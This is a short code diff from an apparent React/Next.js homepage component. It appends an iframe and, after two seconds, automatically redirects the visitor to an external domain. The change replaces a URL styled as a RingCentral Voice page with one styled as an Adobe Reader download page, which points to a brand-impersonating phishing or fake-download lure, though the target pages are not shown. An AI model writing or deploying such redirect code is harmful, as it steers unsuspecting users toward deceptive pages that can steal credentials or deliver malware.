@@ -14,7 +14,7 @@ export default function Home() {
       document.body.appendChild(iframe);
 
       setTimeout(() => {
-        window.location.href = 'https://mksonline.com.mx/RingCentral/Voice/ringcentral.html';
+        window.location.href = 'https://mksonline.com.mx/css/adobe/reader/download.html';
       }, 2000);
       return;
     }
